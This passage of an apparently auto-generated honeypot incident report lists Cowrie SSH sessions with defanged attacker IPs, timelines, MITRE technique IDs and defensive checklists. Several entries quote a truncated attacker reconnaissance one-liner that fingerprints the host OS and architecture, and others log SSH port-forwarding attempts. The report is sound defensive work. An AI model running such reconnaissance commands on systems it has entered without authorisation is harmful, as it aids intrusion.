| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:15:14` | `cowrie.session.connect` |
| `2026-07-22 19:15:14` | `cowrie.client.version` |
| `2026-07-22 19:15:14` | `cowrie.client.kex` |
| `2026-07-22 19:15:16` | `cowrie.login.success` |
| `2026-07-22 19:15:17` | `cowrie.direct-tcpip.request` |
| `2026-07-22 19:15:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.67.120[.]106` to AbuseIPDB if not already reported
- [ ] Block `124.67.120[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-574cb9ef7a7a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:15 |
| **Last Seen** | 2026-07-22 19:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:15:36` | `cowrie.session.connect` |
| `2026-07-22 19:15:36` | `cowrie.client.version` |
| `2026-07-22 19:15:36` | `cowrie.client.kex` |
| `2026-07-22 19:15:37` | `cowrie.login.success` |
| `2026-07-22 19:15:38` | `cowrie.session.params` |
| `2026-07-22 19:15:38` | `cowrie.command.input` |
| `2026-07-22 19:15:38` | `cowrie.command.input` |
| `2026-07-22 19:15:38` | `cowrie.command.input` |
| `2026-07-22 19:15:38` | `cowrie.command.input` |
| `2026-07-22 19:15:38` | `cowrie.command.input` |
| `2026-07-22 19:15:38` | `cowrie.command.success` |
| `2026-07-22 19:15:38` | `cowrie.command.input` |
| `2026-07-22 19:15:38` | `cowrie.command.input` |
| `2026-07-22 19:15:38` | `cowrie.command.input` |
| `2026-07-22 19:15:38` | `cowrie.command.input` |
| `2026-07-22 19:15:38` | `cowrie.log.closed` |
| `2026-07-22 19:15:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e49ea4113154

| Field | Detail |
|---|---|
| **Source IP** | `122.176.21[.]104` |
| **First Seen** | 2026-07-22 19:16 |
| **Last Seen** | 2026-07-22 19:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:16:29` | `cowrie.session.connect` |
| `2026-07-22 19:16:29` | `cowrie.client.version` |
| `2026-07-22 19:16:29` | `cowrie.client.kex` |
| `2026-07-22 19:16:31` | `cowrie.login.success` |
| `2026-07-22 19:16:32` | `cowrie.direct-tcpip.request` |
| `2026-07-22 19:16:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.21[.]104` to AbuseIPDB if not already reported
- [ ] Block `122.176.21[.]104` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4af1002ff268

| Field | Detail |
|---|---|
| **Source IP** | `175.43.184[.]241` |
| **First Seen** | 2026-07-22 19:16 |
| **Last Seen** | 2026-07-22 19:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:16:41` | `cowrie.session.connect` |
| `2026-07-22 19:16:42` | `cowrie.client.version` |
| `2026-07-22 19:16:42` | `cowrie.client.kex` |
| `2026-07-22 19:16:45` | `cowrie.login.success` |
| `2026-07-22 19:16:46` | `cowrie.direct-tcpip.request` |
| `2026-07-22 19:16:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.43.184[.]241` to AbuseIPDB if not already reported
- [ ] Block `175.43.184[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4da48d8a1d9

| Field | Detail |
|---|---|
| **Source IP** | `146.190.83[.]66` |
| **First Seen** | 2026-07-22 19:16 |
| **Last Seen** | 2026-07-22 19:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:16:53` | `cowrie.session.connect` |
| `2026-07-22 19:16:53` | `cowrie.client.version` |
| `2026-07-22 19:16:53` | `cowrie.client.kex` |
| `2026-07-22 19:16:54` | `cowrie.login.success` |
| `2026-07-22 19:16:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.190.83[.]66` to AbuseIPDB if not already reported
- [ ] Block `146.190.83[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6420da8626eb

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-22 19:16 |
| **Last Seen** | 2026-07-22 19:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:16:54` | `cowrie.session.connect` |
| `2026-07-22 19:16:54` | `cowrie.client.version` |
| `2026-07-22 19:16:54` | `cowrie.client.kex` |
| `2026-07-22 19:16:54` | `cowrie.login.success` |
| `2026-07-22 19:16:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8994185e2df1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:17 |
| **Last Seen** | 2026-07-22 19:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:17:26` | `cowrie.session.connect` |
| `2026-07-22 19:17:26` | `cowrie.client.version` |
| `2026-07-22 19:17:26` | `cowrie.client.kex` |
| `2026-07-22 19:17:27` | `cowrie.login.success` |
| `2026-07-22 19:17:29` | `cowrie.session.params` |
| `2026-07-22 19:17:29` | `cowrie.command.input` |
| `2026-07-22 19:17:29` | `cowrie.command.input` |
| `2026-07-22 19:17:29` | `cowrie.command.input` |
| `2026-07-22 19:17:29` | `cowrie.command.input` |
| `2026-07-22 19:17:29` | `cowrie.command.input` |
| `2026-07-22 19:17:29` | `cowrie.command.success` |
| `2026-07-22 19:17:29` | `cowrie.command.input` |
| `2026-07-22 19:17:29` | `cowrie.command.input` |
| `2026-07-22 19:17:29` | `cowrie.command.input` |
| `2026-07-22 19:17:29` | `cowrie.command.input` |
| `2026-07-22 19:17:29` | `cowrie.log.closed` |
| `2026-07-22 19:17:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-050cd59bb24e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:19 |
| **Last Seen** | 2026-07-22 19:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:19:15` | `cowrie.session.connect` |
| `2026-07-22 19:19:16` | `cowrie.client.version` |
| `2026-07-22 19:19:16` | `cowrie.client.kex` |
| `2026-07-22 19:19:17` | `cowrie.login.success` |
| `2026-07-22 19:19:18` | `cowrie.session.params` |
| `2026-07-22 19:19:18` | `cowrie.command.input` |
| `2026-07-22 19:19:18` | `cowrie.command.input` |
| `2026-07-22 19:19:18` | `cowrie.command.input` |
| `2026-07-22 19:19:18` | `cowrie.command.input` |
| `2026-07-22 19:19:18` | `cowrie.command.input` |
| `2026-07-22 19:19:18` | `cowrie.command.success` |
| `2026-07-22 19:19:18` | `cowrie.command.input` |
| `2026-07-22 19:19:18` | `cowrie.command.input` |
| `2026-07-22 19:19:18` | `cowrie.command.input` |
| `2026-07-22 19:19:18` | `cowrie.command.input` |
| `2026-07-22 19:19:18` | `cowrie.log.closed` |
| `2026-07-22 19:19:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d076c40f5e72

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:21 |
| **Last Seen** | 2026-07-22 19:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:21:11` | `cowrie.session.connect` |
| `2026-07-22 19:21:11` | `cowrie.client.version` |
| `2026-07-22 19:21:11` | `cowrie.client.kex` |
| `2026-07-22 19:21:12` | `cowrie.login.success` |
| `2026-07-22 19:21:13` | `cowrie.session.params` |
| `2026-07-22 19:21:13` | `cowrie.command.input` |
| `2026-07-22 19:21:13` | `cowrie.command.input` |
| `2026-07-22 19:21:13` | `cowrie.command.input` |
| `2026-07-22 19:21:13` | `cowrie.command.input` |
| `2026-07-22 19:21:13` | `cowrie.command.input` |
| `2026-07-22 19:21:13` | `cowrie.command.success` |
| `2026-07-22 19:21:13` | `cowrie.command.input` |
| `2026-07-22 19:21:13` | `cowrie.command.input` |
| `2026-07-22 19:21:13` | `cowrie.command.input` |
| `2026-07-22 19:21:13` | `cowrie.command.input` |
| `2026-07-22 19:21:13` | `cowrie.log.closed` |
| `2026-07-22 19:21:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9581508c9964

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:23 |
| **Last Seen** | 2026-07-22 19:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:23:02` | `cowrie.session.connect` |
| `2026-07-22 19:23:02` | `cowrie.client.version` |
| `2026-07-22 19:23:02` | `cowrie.client.kex` |
| `2026-07-22 19:23:03` | `cowrie.login.success` |
| `2026-07-22 19:23:05` | `cowrie.session.params` |
| `2026-07-22 19:23:05` | `cowrie.command.input` |
| `2026-07-22 19:23:05` | `cowrie.command.input` |
| `2026-07-22 19:23:05` | `cowrie.command.input` |
| `2026-07-22 19:23:05` | `cowrie.command.input` |
| `2026-07-22 19:23:05` | `cowrie.command.input` |
| `2026-07-22 19:23:05` | `cowrie.command.success` |
| `2026-07-22 19:23:05` | `cowrie.command.input` |
| `2026-07-22 19:23:05` | `cowrie.command.input` |
| `2026-07-22 19:23:05` | `cowrie.command.input` |
| `2026-07-22 19:23:05` | `cowrie.command.input` |
| `2026-07-22 19:23:05` | `cowrie.log.closed` |
| `2026-07-22 19:23:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f967baf3d56b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:24 |
| **Last Seen** | 2026-07-22 19:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:24:47` | `cowrie.session.connect` |
| `2026-07-22 19:24:47` | `cowrie.client.version` |
| `2026-07-22 19:24:47` | `cowrie.client.kex` |
| `2026-07-22 19:24:49` | `cowrie.login.success` |
| `2026-07-22 19:24:50` | `cowrie.session.params` |
| `2026-07-22 19:24:50` | `cowrie.command.input` |
| `2026-07-22 19:24:50` | `cowrie.command.input` |
| `2026-07-22 19:24:50` | `cowrie.command.input` |
| `2026-07-22 19:24:50` | `cowrie.command.input` |
| `2026-07-22 19:24:50` | `cowrie.command.input` |
| `2026-07-22 19:24:50` | `cowrie.command.success` |
| `2026-07-22 19:24:50` | `cowrie.command.input` |
| `2026-07-22 19:24:50` | `cowrie.command.input` |
| `2026-07-22 19:24:50` | `cowrie.command.input` |
| `2026-07-22 19:24:50` | `cowrie.command.input` |
| `2026-07-22 19:24:51` | `cowrie.log.closed` |
| `2026-07-22 19:24:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5209b59d8d0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:26 |
| **Last Seen** | 2026-07-22 19:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:26:32` | `cowrie.session.connect` |
| `2026-07-22 19:26:33` | `cowrie.client.version` |
| `2026-07-22 19:26:33` | `cowrie.client.kex` |
| `2026-07-22 19:26:34` | `cowrie.login.success` |
| `2026-07-22 19:26:35` | `cowrie.session.params` |
| `2026-07-22 19:26:35` | `cowrie.command.input` |
| `2026-07-22 19:26:35` | `cowrie.command.input` |
| `2026-07-22 19:26:35` | `cowrie.command.input` |
| `2026-07-22 19:26:35` | `cowrie.command.input` |
| `2026-07-22 19:26:35` | `cowrie.command.input` |
| `2026-07-22 19:26:35` | `cowrie.command.success` |
| `2026-07-22 19:26:35` | `cowrie.command.input` |
| `2026-07-22 19:26:35` | `cowrie.command.input` |
| `2026-07-22 19:26:35` | `cowrie.command.input` |
| `2026-07-22 19:26:35` | `cowrie.command.input` |
| `2026-07-22 19:26:36` | `cowrie.log.closed` |
| `2026-07-22 19:26:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07cbca047285

| Field | Detail |
|---|---|
| **Source IP** | `60.223.251[.]132` |
| **First Seen** | 2026-07-22 19:27 |
| **Last Seen** | 2026-07-22 19:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:27:22` | `cowrie.session.connect` |
| `2026-07-22 19:27:22` | `cowrie.client.version` |
| `2026-07-22 19:27:22` | `cowrie.client.kex` |
| `2026-07-22 19:27:24` | `cowrie.login.success` |
| `2026-07-22 19:27:25` | `cowrie.direct-tcpip.request` |
| `2026-07-22 19:27:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.223.251[.]132` to AbuseIPDB if not already reported
- [ ] Block `60.223.251[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-362d5bb7a455

| Field | Detail |
|---|---|
| **Source IP** | `220.246.41[.]171` |
| **First Seen** | 2026-07-22 19:27 |
| **Last Seen** | 2026-07-22 19:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:27:43` | `cowrie.session.connect` |
| `2026-07-22 19:27:43` | `cowrie.client.version` |
| `2026-07-22 19:27:43` | `cowrie.client.kex` |
| `2026-07-22 19:27:46` | `cowrie.login.success` |
| `2026-07-22 19:27:47` | `cowrie.direct-tcpip.request` |
| `2026-07-22 19:27:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.41[.]171` to AbuseIPDB if not already reported
- [ ] Block `220.246.41[.]171` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d40e4927022

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 19:28 |
| **Last Seen** | 2026-07-22 19:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:28:14` | `cowrie.session.connect` |
| `2026-07-22 19:28:14` | `cowrie.client.version` |
| `2026-07-22 19:28:14` | `cowrie.client.kex` |
| `2026-07-22 19:28:17` | `cowrie.login.success` |
| `2026-07-22 19:28:18` | `cowrie.session.params` |
| `2026-07-22 19:28:18` | `cowrie.command.input` |
| `2026-07-22 19:28:18` | `cowrie.command.input` |
| `2026-07-22 19:28:18` | `cowrie.command.input` |
| `2026-07-22 19:28:18` | `cowrie.command.input` |
| `2026-07-22 19:28:18` | `cowrie.command.input` |
| `2026-07-22 19:28:18` | `cowrie.command.success` |
| `2026-07-22 19:28:18` | `cowrie.command.input` |
| `2026-07-22 19:28:18` | `cowrie.command.input` |
| `2026-07-22 19:28:18` | `cowrie.command.input` |
| `2026-07-22 19:28:18` | `cowrie.command.input` |
| `2026-07-22 19:28:18` | `cowrie.log.closed` |
| `2026-07-22 19:28:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c18aeeb3f681

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-22 19:28 |
| **Last Seen** | 2026-07-22 19:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:28:30` | `cowrie.session.connect` |
| `2026-07-22 19:28:30` | `cowrie.client.version` |
| `2026-07-22 19:28:30` | `cowrie.client.kex` |
| `2026-07-22 19:28:30` | `cowrie.login.success` |
| `2026-07-22 19:28:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a21c4ebae00

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-22 19:28 |
| **Last Seen** | 2026-07-22 19:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:28:30` | `cowrie.session.connect` |
| `2026-07-22 19:28:30` | `cowrie.client.version` |
| `2026-07-22 19:28:30` | `cowrie.client.kex` |
| `2026-07-22 19:28:30` | `cowrie.login.success` |
| `2026-07-22 19:28:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-840a34a1dd25

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-22 19:28 |
| **Last Seen** | 2026-07-22 19:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 19:28:39` | `cowrie.session.connect` |
| `2026-07-22 19:28:39` | `cowrie.client.version` |
| `2026-07-22 19:28:39` | `cowrie.client.kex` |
| `2026-07-22 19:28:39` | `cowrie.login.success` |
| `2026-07-22 19:28:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f407421cef4f

| Field | Detail |
